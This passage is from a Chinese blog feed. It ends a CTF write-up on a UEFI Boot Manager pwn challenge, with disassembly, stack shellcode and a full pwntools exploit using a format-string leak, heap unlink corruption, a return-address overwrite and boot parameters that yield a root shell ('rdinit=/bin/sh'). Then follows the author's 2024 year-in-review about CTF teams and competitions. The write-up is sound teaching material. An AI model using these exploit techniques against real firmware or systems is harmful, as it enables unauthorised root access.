class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000B982                 call    sub_6107</span><br><span class="line">.text:000000000000B987                 call    sub_11117</span><br><span class="line">.text:000000000000B98C                 call    sub_13FAC</span><br><span class="line">.text:000000000000B991                 mov     rax, cs:gBS</span><br><span class="line">.text:000000000000B998                 xor     edx, edx</span><br><span class="line">.text:000000000000B99A                 lea     r8, [rsp+138h+var_80]</span><br><span class="line">.text:000000000000B9A2                 lea     rcx, unk_1E100</span><br><span class="line">.text:000000000000B9A9                 call    qword ptr [rax+140h]</span><br><span class="line">.text:000000000000B9AF                 <span class="built_in">test</span>    rax, rax</span><br><span class="line">.text:000000000000B9B2                 js      short loc_B9E0</span><br><span class="line">.text:000000000000B9B4                 mov     rax, [rsp+138h+var_80]</span><br></pre></td></tr></table></figure><p>然后我绞尽脑汁想了半天，期间还找了出题人问了一下，最后发现是一个很低级和基础的问题😇。可能是由于 qemu 的缘故或者是其他什么的原因，导致 UiApp 的 text 段可写，而堆块在脱链的过程中存在下面这一步：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;</span><br></pre></td></tr></table></figure><p>也就是说我们目标地址偏移为 8 的地方会给写入一个地址，这样子就导致我们 UiApp 的 text 段被修改，后面的操作就会出现错误。<br>我们观察到栈上可执行，所以我们可以在栈上写入 shellcode 然后将 ret 覆盖为 shellocde 的地址，其 shellcode 如下：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    jmp WIN;</span><br><span class="line">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span><br><span class="line">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span><br><span class="line">WIN:</span><br><span class="line">    mov rax, uiapp_base + 0xb982;</span><br><span class="line">    jmp rax;</span><br></pre></td></tr></table></figure><p>中间的 0x90 是为了填充数据，在堆块脱链的时候这部分会给修改为一个地址，不过由于我们前面直接 jmp 到后面的关键代码去了，所以 shellcode 的执行不会受到影响。<br>shellcode 我们可以在选择 Administrator 用户登录输入 key 时将其保留到栈上。  </p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>和上面那题一样，由于 Boot Manager 是可视化界面，在 pwntools 上非常难看，所以这里使用 socat 连接。</p><h4 id="exp-sh-1"><a href="#exp-sh-1" class="headerlink" title="exp.sh"></a>exp.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">socat $(<span class="built_in">tty</span>),<span class="built_in">echo</span>=0,escape=0x03 SYSTEM:<span class="string">&#x27;python3 ./exp.py&#x27;</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;run.py&#x27;</span>])</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(1. Administrator 2. Visitor):&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(index).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,desc,<span class="built_in">id</span>=<span class="number">10</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;ID:&#x27;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="built_in">id</span>).encode()+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    p.send(name+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Desc:&#x27;</span>)</span><br><span class="line">    p.send(desc+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">choice,msg</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    menu(choice)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">        p.send(msg+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Desc:&#x27;</span>)</span><br><span class="line">        p.send(msg+<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enterOS</span>():</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">key_map = &#123;</span><br><span class="line">    <span class="string">b&quot;up&quot;</span>:    <span class="string">b&quot;\x1b[A&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;down&quot;</span>:  <span class="string">b&quot;\x1b[B&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;left&quot;</span>:  <span class="string">b&quot;\x1b[D&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;right&quot;</span>: <span class="string">b&quot;\x1b[C&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;esc&quot;</span>:   <span class="string">b&quot;\x1b^[&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;enter&quot;</span>: <span class="string">b&quot;\r&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;tab&quot;</span>:   <span class="string">b&quot;\t&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_key</span>(<span class="params">key,times = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        p.send(key_map[key])</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&quot;enter&quot;</span>:</span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;\x1b[24~&quot;</span>*<span class="number">10</span>)</span><br><span class="line">role(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Username:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;User [&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;.&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;.&quot;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;.&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">uiapp_base = leak - <span class="number">0x173f5</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;uiapp_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Visitor): &quot;</span>, <span class="string">b&quot;1\r&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Username: &quot;</span>, <span class="string">b&quot;Admin\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    jmp WIN;</span></span><br><span class="line"><span class="string">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span></span><br><span class="line"><span class="string">    .byte 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90;</span></span><br><span class="line"><span class="string">WIN:</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;uiapp_base + <span class="number">0xb982</span>&#125;</span>;</span></span><br><span class="line"><span class="string">    jmp rax;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Pass key: &quot;</span>, shellcode+<span class="string">b&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">role(<span class="number">2</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">7</span> + p8(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">6</span> + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">7</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafafafafafaf</span>)*<span class="number">6</span> + p32(<span class="number">0x30646870</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafaf6c617470</span>) + p8(<span class="number">0x60</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">6</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">ret = stack - <span class="number">0x104ba</span></span><br><span class="line">shellcode = ret - <span class="number">0x49</span></span><br><span class="line">lg(<span class="string">&quot;ret&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x78</span> + p32(ret)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x70</span> + p32(shellcode) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">3</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;\xef&#x27;</span>*<span class="number">0x68</span> + p32(<span class="number">0x30726670</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">3</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0xafafafaf6c617470</span>) + p8(<span class="number">0x60</span>) + <span class="string">b&#x27;\xaf&#x27;</span>*(<span class="number">6</span>-i)</span><br><span class="line">    edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">enterOS()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Press any key to continue...&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Standard PC&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rrootshell\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;up&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;esc&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="学习文章"><a href="#学习文章" class="headerlink" title="学习文章"></a>学习文章</h2><p><a href="https://www.anquanke.com/post/id/283073">从一道题入门 UEFI PWN</a><br><a href="https://github.com/yikesoftware/d3ctf-2022-pwn-d3guard">d3ctf-2022-pwn-d3guard</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【祭】圈圈无为的2024年</title>
      <link href="/2024/12/31/2024/"/>
      <url>/2024/12/31/2024/</url>
      
        <content type="html"><![CDATA[<h2 id="承接2023"><a href="#承接2023" class="headerlink" title="承接2023"></a>承接2023</h2><p>还记得 2023 年 12 月 31 号的晚上，圈圈看着 pazuris 博客上的年度终结（这里打错字了，pazuirs 原话：“才发现年度终结，我搁这开大招了是吧😆”。然后圈圈也不想改🤔），坐在椅子上沉默了一个多小时。是的，圈圈破防了，他认为自己的这一年一事无成，留下了许多的遗憾。于是圈圈当时就下定决心，在新的一年里要挖粪涂墙，弥补 2023 年的遗憾，并实现更多的目标。  </p><h2 id="圈圈的2024"><a href="#圈圈的2024" class="headerlink" title="圈圈的2024"></a>圈圈的2024</h2><p>当时的圈圈是一位全职 CTF 选手，整个大二上学期都在猛猛的学 pwn，可是校队里面没有别的 pwn 手和圈圈一起讨论 pwn 题，而且能和圈圈打每一场比赛的也就只有 panz0e 师傅（真的非常感谢他&#x2F;(ㄒoㄒ)&#x2F;~~），没有一场比赛能够打进线下，当时的圈圈十分渴望能够打进线下赛，可是像什么香山杯什么强网杯都只差一道题，心态直接崩溃了。圈圈很早就知道有联合战队这个东西(圈圈这个时候对联合战队充满着敬畏之心，觉得联合战队是一个由一堆顶级的师傅联合起来的地方)，看到 pazuris 的博客里有提到 V&amp;N 战队，于是 23 年 12 月 31 号就加了 pazuris 的好友并询问如何加入，然后我就加上了当时 V&amp;N 的队长 eeee 师傅。当时还是很兴奋了，这是我第一次能够和除校队以外的 pwn 师傅交流，于是和 eeee 聊了很多，包括堆利用的各种 house 什么什么的，也了解到 eeee 师傅刚考完研。<br>面试时间很快就定下来了，不过由于 V&amp;N 的师傅们要参加期末考试，于是就找了 W&amp;M 的 wjh 和 cnitlrt 师傅来面我。当时知道这个消息后也挺难崩的（什么？我打宿傩？），感觉要 gg 了，不过好在面试的时候各种堆栈利用全都回答出来了，最后 cnitlrt 问了我一个 io uring。这玩意当时还不怎么流行所以没回答出来，不过最后还是“有惊有险”的加入了 V&amp;N。 </p><p>期末考完后 nssctf 就开了，当时和 pazuris 和 unknown 组了个队去玩，结果题目异常简单，差一题 re 就 ak 了（圈圈没做出来那题 C# 逆向😇）  </p><img src="/2024/12/31/2024/44.png" class="" title="我的图图呢"> <p>加入 V&amp;N 后的第一场和他们打的比赛是 xctf 分站赛 l3hctf，当时的 V&amp;N 好像没什么人打，而且和数模美赛冲突了，圈圈打了 2 crypto 2 misc，pwn？不会做，和 korey0sh1 师傅想了半天发现给 xtx 师傅做出来了。还记得有题密码，圈圈手动将其密钥分成了 16 个范围然后硬爆破，和 panz0e 师傅搞到凌晨 5 点才爆破出来。  </p><img src="/2024/12/31/2024/43.jpg" class="" title="我的图图呢"><p>接下来就是 V&amp;N newbe 的组建阶段，unknown 师傅当上了 V&amp;N 的新一任队长，然后 VNCTF2024 也在那个时候举行。这是圈圈第一次在外面的比赛出题，也是第一次在外面拉屎。只能说出了题逆向题而不是 pwn，完全没有什么技术含量（题目名字是shellshock，现在想骂我还来得及😀）。不过没想到还会有人做出来了，还是非预期（enllusion 师傅太强了）。VNCTF 结束后就开始 V&amp;N 的招人阶段，圈圈也阴阳交错的加入到了招人组，不断的和问卷中的各个师傅联系然后安排面试时间什么的（没有一个 pwn）。可是这个时候圈圈突然得了超级严重的急性肠胃炎，下半身直接失去的直觉，最后在家人的帮助和在医院打了两个吊针之后挺了过来。这也是圈圈第一次产生了对 * * 的恐惧，也坚定了圈圈要打造一副好身体的决心。所以开学后圈圈只要有空就会去跑步，一开始是和另外一位同学一起去跑的，后面发现这样子不太方便，就变成一个人跑了。逐渐的，圈圈爱上了跑步，跑步会上瘾！！  </p><p>unknown 师傅也喜欢跑步，而且非常厉害，经常看他跑 10 公里，太 new 拉！  </p><p>如果说大二上是圈圈学 pwn 的一个学期，那么大二下就是圈圈转型的一个学期。B站年度总结为证🤣</p><img src="/2024/12/31/2024/38.jpg" class="" title="我的图图呢"><p>GZ：“黑马的视频你看的下去的？40h”<br>圈圈：“当然看不下去，要是看得下去就不止 40h 了😇”  </p><p>由于圈圈是从大一的暑假才开始学 pwn 的，为了赶上别人的进度，整个大二上每天都最少分配五个小时在学习 pwn，可是一个学期下来圈圈感觉自己都要变成做题家了，除了做题还是做题，于是圈圈产生了学习别的领域的知识的想法。当然，能想到的第一件事情就是 JAVA 后端开发，于是圈圈就把黑马的 JAVA WEB 给刷了一遍。  </p><img src="/2024/12/31/2024/2.png" class="" title="我的图图呢"><p>同时由于大二下学期的编译原理实验全都要求要可视化，所以圈圈又把B站上的 Qt 入门视频也刷了一遍……  </p><img src="/2024/12/31/2024/3.png" class="" title="我的图图呢"><p>后面发现专门去学 Qt 怎么使用有点浪费时间了，因为最后在做编译原理实验的时候可视化那部分根本不需要使用什么高级的语法，直接把要求喂给 GPT 就搞定了，无语子。<br>学完黑马的 JAVA WEB 后圈圈感觉要找找项目练练手，由于学院的项目全都是和 ai 有关的，圈圈不是很懂，所以只能自己找项目写写，找的还是黑马上面 “**外卖”，跟着敲了一半，感觉这玩意完全就是抄作业，所以后面也没跟着做下去了。刚好期末软件工程也要交一个项目，所以圈圈就和室友组队负责项目的后端部分，最后一顿操作下来一堆 bug，还好文档写的好看，最后期末和平时分都给了圈圈 90 多分（笑  </p><p>圈圈学过一段时间 ai，买了本西瓜书啃了一个星期，发现看不懂。搞不懂原理学应用总行了把，于是圈圈又买了本《python机器学习基础教程》。看了半天感觉和圈圈平时打数模比赛的东西差不多，然后就没继续看下去了。  </p><p>这学期圈圈也学了挺长时间的渗透，首先是把 N1 那边内网渗透体系建设除最后 2 章外的内容全刷了一样吧。别说，圈圈学的可认真了，甚至每一页都有笔记（现在回想起来就想笑）。然后更着B站的红队笔记去打 vulnhub 的简单靶机，后面发现 pwn 手不太适合搞这玩意，就没再继续搞下去了。  </p><p>好，再回到 V&amp;N，VNnewbe 组建后很快就迎来了 XCTF 最后一场分站赛 DubheCTF，V&amp;N 能不能进 final 就看这一场了。由于圈圈是在 VNnewbe 创建前加的 VN，所以 newbe 里很多师傅都以为圈圈的老登，特别是 pwn 方向，导致圈圈 DubheCTF 压力拉满。比赛一开始，打开 pwn，一题是 UEFI SSM，另外一题是代码量多到爆炸的 golang 协议 pwn，圈圈当时直接没眼看了。</p><p>中间打到破防了去旁边的 VCTF 摸了一下鱼，不小心拿了个 pwn 方向第一 :)  </p><img src="/2024/12/31/2024/45.jpg" class="" title="我的图图呢"><p>事实证明，人在压力大的时候会突破极限，那场比赛圈圈和 xtx 师傅合作做出来了 golang pwn，手快拿了签到 pyjail 二血，一个人做出来了一个用户自定义堆管理系统的 pwn。遗憾的是 V&amp;N 差一名进决赛，心态有点小崩，圈圈在 CTF 上最终的梦想就是参与一次 XCTF final。后面和 V&amp;N 的比赛好像就没什么特别的了，圈圈只要有空就会去参加，然后划水摸鱼摸个 2、3 题 pwn，有时运气好出一些简单的密码和逆向。  </p><p>大二上也迎来了圈圈第一场线下赛，广东省省赛，不过这个比赛太多吐槽点了。这里不多说，直接上图：  </p><img src="/2024/12/31/2024/4.jpg" class="" title="我的图图呢"><p>好，骂爽了，不过比赛还是要参加。可是谁又能想到 3 pwn 1 web 组成的队去打一场只有 web 的 awdp 能拿到一等奖呢？😂  </p><img src="/2024/12/31/2024/5.jpg" class="" title="我的图图呢"><p>虽然比赛办的很屎，可是还是见到了 23 年年底让圈圈破防的 pazuris 师傅，也聊了挺多。  </p><p>打完省赛的下一周又要跑去桂林打 CISCN 半决赛了，不过只能说，办的也很屎。打的是 awd，2 web 1 pwn，又是 pwn 手破防局。然后每个队伍靶机的账号密码都是一样的，比赛一开始直接给人拿脚本改了。且不说弱口令，pwn 靶机和其中一个 web 靶机选手居然没有权限修！！！真是屎中屎，可是圈圈他们是冠军！！！  </p><img src="/2024/12/31/2024/6.jpg" class="" title="我的图图呢"><p>真是给圈圈打爽了。</p><img src="/2024/12/31/2024/27.jpg" class="" title="我的图图呢"><p>上面这个图没有圈圈啊（笑  </p><p>还有为什么桂林电子科技大学环境这么好，你师专真是什么都比不上别人啊😡  </p><img src="/2024/12/31/2024/42.jpg" class="" title="我的图图呢"><p>结束后的那个晚上圈圈、unknown、pazuris 在酒店里聊了好几个小时，主要内容还是关于未来的发展方向，感概挺多的，具体内容就不在这里说了。  </p><p>这个学期圈圈也参加了别的比赛，其中印像最深的是蓝桥杯。圈圈为了傻逼的保研加分参加了蓝桥杯的 CTF 和算法，结果算法拿了个省一，而 CTF 省二（评价为打 d3ctf 的 php pwn 把我 gdb 环境搞炸了，然后比赛断网搞的我不知道要怎么修），都不好意思说出去给人听了。由于这个比赛太傻逼了，加上算法的决赛和 CTF 省赛在同一个星期，于是找了个借口把算法决赛给翘了（辅导员还蒙在鼓里😋。  </p><p>考完期末圈圈后和 HvAng、Chimedal 从天河区骑车到大学城，热到爆炸🥵🥵🥵  </p><img src="/2024/12/31/2024/9.jpg" class="" title="我的图图呢"><p>可是绿豆沙也是真的好喝😋  </p><img src="/2024/12/31/2024/10.jpg" class="" title="我的图图呢"><p>很快圈圈就迎来了大二的暑假，圈圈认为这是他有史以来度过的最失败的一个假期（指的是没有学什么东西）。七月份在准备 CISCN 决赛，在学车联网、可信计算（傻逼玩意）、工控流量分析。后面 build 环节来了，队友不是在忙实习就是在搞保研，最后全是圈圈一个人搞，最终 75 分还勉强看得过去。决赛也打的挺憋屈的，第一个 awdp 感觉我们的 break 分都前十了，可是没什么经验 fix 很慢，导致比某些 break 0 分的队伍分数还要低。第二的渗透更加的憋屈，队里的师傅没打过云境，没打一部都要花很多的时间，最终喜提三等奖😭😭😭（都不好意思写简历上）<br>家附近没有跑道，而且路不是很平，所以圈圈就将运动方式改为 CityBike 😋。圈圈每天带着他的小车车，早上骑：  </p><img src="/2024/12/31/2024/8.jpg" class="7.jpg) 晚上骑： {% asset_img" title="我的图图呢"><p>然后和家人去江西和安徽旅游，去了很多景点，其中景色最好的感觉是黄山，爬的最累的是三清山（要把圈圈脚给爬断了💀）<br>黄山：   </p><img src="/2024/12/31/2024/11.jpg" class="" title="我的图图呢"><p>松鼠🥰🥰</p><img src="/2024/12/31/2024/12.jpg" class="" title="我的图图呢"><p>这里忘记是哪里了：</p><img 